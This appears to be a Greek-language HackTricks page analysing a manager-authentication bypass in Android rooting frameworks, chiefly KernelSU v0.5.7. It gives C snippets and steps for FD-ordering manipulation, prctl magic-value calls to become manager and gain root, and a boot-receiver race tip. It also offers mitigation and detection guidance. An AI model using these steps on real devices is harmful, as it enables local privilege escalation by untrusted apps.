# Android Rooting Frameworks (KernelSU/Magisk) Παράκαμψη Αυθεντικοποίησης Manager & Κατάχρηση Syscall Hook

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks όπως τα KernelSU, APatch, SKRoot και Magisk συχνά τροποποιούν τον Linux/Android kernel και εκθέτουν privileged λειτουργικότητα σε μια unprivileged userspace εφαρμογή "manager" μέσω ενός hooked syscall. Αν το βήμα manager-authentication έχει αδυναμίες, οποιαδήποτε local εφαρμογή μπορεί να αποκτήσει πρόσβαση σε αυτό το κανάλι και να κάνει privilege escalation σε συσκευές που είναι ήδη rooted.

Αυτή η σελίδα αφαιρεί τις περιττές λεπτομέρειες από τις τεχνικές και τις παγίδες που αποκαλύφθηκαν σε public research (ιδιαίτερα την ανάλυση της Zimperium για το KernelSU v0.5.7), ώστε τόσο οι red όσο και οι blue teams να κατανοήσουν τα attack surfaces, τα exploitation primitives και τα robust mitigations.

---
## Μοτίβο αρχιτεκτονικής: syscall-hooked manager channel

- Το kernel module/patch κάνει hook σε ένα syscall (συνήθως το prctl) για να λαμβάνει "commands" από το userspace.
- Το protocol συνήθως είναι: magic_value, command_id, arg_ptr/len ...
- Μια userspace manager app κάνει πρώτα authentication (π.χ. CMD_BECOME_MANAGER). Μόλις το kernel χαρακτηρίσει τον caller ως trusted manager, γίνονται αποδεκτά τα privileged commands:
- Grant root στον caller (π.χ. CMD_GRANT_ROOT)
- Διαχείριση allowlists/deny-lists για το su
- Τροποποίηση του SELinux policy (π.χ. CMD_SET_SEPOLICY)
- Query version/configuration
- Επειδή οποιαδήποτε app μπορεί να καλέσει syscalls, η ορθότητα του manager authentication είναι κρίσιμη.

Παράδειγμα (KernelSU design):
- Hooked syscall: prctl
- Magic value για redirect στο KernelSU handler: 0xDEADBEEF
- Τα commands περιλαμβάνουν: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT κ.λπ.

---
## Ροή authentication του KernelSU v0.5.7 (όπως έχει υλοποιηθεί)

Όταν το userspace καλεί prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), το KernelSU επαληθεύει:

1) Έλεγχος prefix του path
- Το παρεχόμενο path πρέπει να ξεκινά με το αναμενόμενο prefix για το caller UID, π.χ. /data/data/<pkg> ή /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.

2) Έλεγχος ownership
- Το path πρέπει να ανήκει στο caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.

3) Έλεγχος APK signature μέσω σάρωσης του FD table
- Γίνεται iterate στα open file descriptors της calling process.
- Επιλέγεται το πρώτο file του οποίου το path ταιριάζει με /data/app/*/base.apk.
- Γίνεται parse του APK v2 signature και verification έναντι του official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).

Αν όλοι οι έλεγχοι επιτύχουν, το kernel αποθηκεύει προσωρινά το UID του manager και αποδέχεται privileged commands από αυτό το UID μέχρι το reset.

---
## Vulnerability class: εμπιστοσύνη στο “πρώτο matching APK” από το FD iteration

Αν ο signature check συνδέεται με το "πρώτο matching /data/app/*/base.apk" που βρίσκεται στο process FD table, τότε στην πραγματικότητα δεν επαληθεύει το package του caller. Ένας attacker μπορεί να τοποθετήσει εκ των προτέρων ένα legitimately signed APK (του πραγματικού manager), ώστε να εμφανίζεται νωρίτερα στο FD list από το δικό του base.apk.

Αυτή η trust-by-indirection επιτρέπει σε μια unprivileged app να impersonate τον manager χωρίς να διαθέτει το signing key του manager.

Βασικές ιδιότητες που γίνονται exploited:
- Το FD scan δεν συνδέεται με το package identity του caller· κάνει μόνο pattern-matching σε path strings.
- Το open() επιστρέφει το χαμηλότερο διαθέσιμο FD. Κλείνοντας πρώτα τα FDs με μικρότερο αριθμό, ένας attacker μπορεί να ελέγξει το ordering.
- Το filter ελέγχει μόνο ότι το path ταιριάζει με /data/app/*/base.apk – όχι ότι αντιστοιχεί στο installed package του caller.

---
## Προϋποθέσεις επίθεσης

- Η συσκευή είναι ήδη rooted με ένα vulnerable rooting framework (π.χ. KernelSU v0.5.7).
- Ο attacker μπορεί να εκτελέσει arbitrary unprivileged code τοπικά (Android app process).
- Ο πραγματικός manager δεν έχει κάνει ακόμη authentication (π.χ. αμέσως μετά από reboot). Ορισμένα frameworks κάνουν cache το manager UID μετά την επιτυχία· πρέπει να κερδίσετε το race.

---
## Περίγραμμα exploitation (KernelSU v0.5.7)

Βήματα υψηλού επιπέδου:
1) Δημιουργήστε ένα valid path προς το δικό σας app data directory, ώστε να ικανοποιηθούν οι prefix και ownership checks.
2) Βεβαιωθείτε ότι ένα genuine KernelSU Manager base.apk έχει ανοιχτεί σε FD με μικρότερο αριθμό από το δικό σας base.apk.
3) Καλέστε prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) για να περάσετε τους checks.
4) Εκτελέστε privileged commands όπως CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY για να διατηρήσετε το elevation.

Πρακτικές σημειώσεις για το βήμα 2 (FD ordering):
- Εντοπίστε το FD της διεργασίας σας για το δικό σας /data/app/*/base.apk, κάνοντας walk στα /proc/self/fd symlinks.
- Κλείστε ένα low FD (π.χ. stdin, fd 0) και ανοίξτε πρώτα το legitimate manager APK, ώστε να καταλάβει το fd 0 (ή οποιοδήποτε index μικρότερο από το FD του δικού σας base.apk).
- Κάντε bundle το legitimate manager APK με την app σας, ώστε το path του να ικανοποιεί το naive filter του kernel. Για παράδειγμα, τοποθετήστε το κάτω από ένα subpath που ταιριάζει με /data/app/*/base.apk.

Παραδείγματα αποσπασμάτων κώδικα (Android/Linux, μόνο για illustrative purposes):

Enumerate open FDs για να εντοπίσετε entries του base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Εξαναγκάστε ένα FD με μικρότερο αριθμό να δείχνει στο νόμιμο manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Αυθεντικοποίηση διαχειριστή μέσω prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Μετά την επιτυχία, privileged commands (παραδείγματα):
- CMD_GRANT_ROOT: προώθηση της τρέχουσας διεργασίας σε root
- CMD_ALLOW_SU: προσθήκη του package/UID σας στη allowlist για persistent su
- CMD_SET_SEPOLICY: προσαρμογή του SELinux policy όπως υποστηρίζεται από το framework

Συμβουλή για Race/persistence:
- Καταχωρίστε έναν BOOT_COMPLETED receiver στο AndroidManifest (RECEIVE_BOOT_COMPLETED), ώστε να ξεκινά νωρίς μετά από reboot και να επιχειρεί authentication πριν από τον πραγματικό manager.

---
## Οδηγίες Detection και mitigation

Για developers frameworks:
- Συνδέστε το authentication με το package/UID του caller και όχι με αυθαίρετα FDs:
- Επιλύστε το package του caller από το UID του και επαληθεύστε το έναντι του signature του εγκατεστημένου package (μέσω PackageManager), αντί να κάνετε scanning των FDs.
- Αν χρησιμοποιείτε μόνο kernel, αξιοποιήστε stable caller identity (task creds) και επικυρώστε την από stable source of truth που διαχειρίζεται το init/userspace helper, όχι από process FDs.
- Αποφύγετε τους ελέγχους path-prefix ως identity· ο caller μπορεί να τους ικανοποιήσει trivially.
- Χρησιμοποιήστε nonce-based challenge–response μέσω του channel και εκκαθαρίστε κάθε cached manager identity κατά το boot ή σε βασικά events.
- Εξετάστε authenticated IPC βασισμένο σε binder αντί για υπερφόρτωση generic syscalls, όπου είναι εφικτό.

Για defenders/blue team:
- Εντοπίζετε την παρουσία rooting frameworks και manager processes· παρακολουθείτε calls προς prctl με ύποπτες magic constants (π.χ. 0xDEADBEEF), εφόσον διαθέτετε kernel telemetry.
- Σε managed fleets, αποκλείστε ή δημιουργήστε alert για boot receivers από untrusted packages που επιχειρούν ταχύτατα privileged manager commands μετά το boot.
- Βεβαιωθείτε ότι οι συσκευές έχουν ενημερωμένες patched εκδόσεις των frameworks· ακυρώστε τα cached manager IDs κατά το update.

Περιορισμοί του attack:
- Επηρεάζει μόνο συσκευές που είναι ήδη rooted με vulnerable framework.
- Συνήθως απαιτεί reboot/race window πριν από το authentication του legitimate manager (ορισμένα frameworks αποθηκεύουν σε cache το manager UID μέχρι το reset).

---
## Σχετικές σημειώσεις μεταξύ frameworks

- Το password-based auth (π.χ. historical APatch/SKRoot builds) μπορεί να είναι weak αν τα passwords είναι guessable/bruteforceable ή αν τα validations έχουν bugs.
- Το package/signature-based auth (π.χ. KernelSU) είναι ισχυρότερο in principle, αλλά πρέπει να συνδέεται με τον actual caller και όχι με indirect artefacts, όπως FD scans.
- Magisk: Το CVE-2024-48336 (MagiskEoP) έδειξε ότι ακόμη και mature ecosystems μπορεί να είναι ευάλωτα σε identity spoofing, το οποίο οδηγεί σε code execution με root μέσα στο manager context.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
